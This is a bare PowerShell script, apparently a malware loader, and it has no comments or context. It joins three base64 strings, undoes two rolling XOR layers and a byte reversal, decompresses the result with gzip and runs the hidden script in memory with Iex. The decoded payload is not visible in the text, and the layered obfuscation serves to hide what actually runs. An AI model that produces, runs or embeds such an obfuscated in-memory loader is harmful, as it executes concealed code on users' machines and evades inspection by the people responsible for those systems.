$p1='gfzy29U5oXA2OMCGM5G6y1I8gEIVITsyLli8FAmnHhELGQMUDOSRhKG5H6w4tVXAeJPEuQG1Acri7LqFISnFmSz9cpK3PM06jwq9NHhqWqQoXkf92ctquxrKvOQJWJRJn23WVQO7t8O85/cWhSvekKZntgl6ErKFXcz6RsdNv2EJ+K8SODemfZMq/4QJkfG7CPGpA6nXCYIMV5LMwmNz1NKIPZTNsQiR+4N49OELyKxA/0vNc2BoCh4GySb52YI12GJqLDKbaYpUTf25BNcY4i7tvIS6YzrGZsoCVIXiXsj7IAYnIE2X8/+GdiWJiaAigWP/X24ksBk/TzoukDgrkGRGIe18mjXyzFJxhHWv8YobnQXs'
$p2='SLohwOUmo2UMc3y5xtEHL3+63hwcvmbQETbz8eU3EUrylYrdd0Jsha1miVN7fqzbHDnUz0lYni3Oo19ls5tqLzLizty6LnqJZtCCgPfTRN/M0HNvrdJhGvyO6pa4bxXpeygR326fKoS4x4v/zLxAGR45eKWYCKaPdJzVu1i2x7RoWv23/I/xIe8Qkkdwh8YabLIkaqrrgXuq67xW5YbuLHd2O2Z7k0quTCQpoIv5U2JTIUL2TaAjBSA+efNOBTbL7qTXxRfGqs6z7Y6rOrulXKFwofO/ifx84fIZPytvKCzJGhUMgG7uuc9S9gqGTxsVeyM6Bp73M0hTYUOYNenvT0qEqNdCkuLk2hBhICkKgmvNav1t'
$p3='26D0UpmtXjoqfr/2Jw0cOg+N6znp3rLyY+HIrLaAWb5nyQEXb3TPftrZ8oQtaEJvxe7qzCPKycPvCcN1vMZvd3SSkysA2ytphcE/tEVlkTK7Q2Dm8u93JKidO6WPAvMORhiMaj7rX+1rYI75jrfUAkRcMfH0TIUp9KTNMW3H2bYnlKQw14NAp8I9OMKypYrVnO6mP7tW66YL3x3gwfqzGr4fyfgaLTAKiyTOofazw57gagwFOh5GusY1K701P2V8jNObPy0IDEn9IgW2PscNy1g/YXulFW2p+gKQewlUYr5KPGpX5/C6hsleWxJ4sUxaqRUn3sPnktVrH8kYHUi4wXUUNeFiVVrLMSgrKiUgJy6yKw=='
$k1=135
$k2=65

$b64=$p1+$p2+$p3

$b=[Convert]::FromBase64String($b64)

$x2=@()
for($i=0;$i -lt $b.Length;$i++){$x2+=$b[$i] -bxor ($k2+$i*2)%256}

[Array]::Reverse($x2)

$x1=@()
for($i=0;$i -lt $x2.Length;$i++){$x1+=$x2[$i] -bxor ($k1+$i)%256}

$ms=New-Object System.IO.MemoryStream($x1,$false)
$cs=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
$sr=New-Object System.IO.StreamReader($cs)
$script=$sr.ReadToEnd()

Iex $script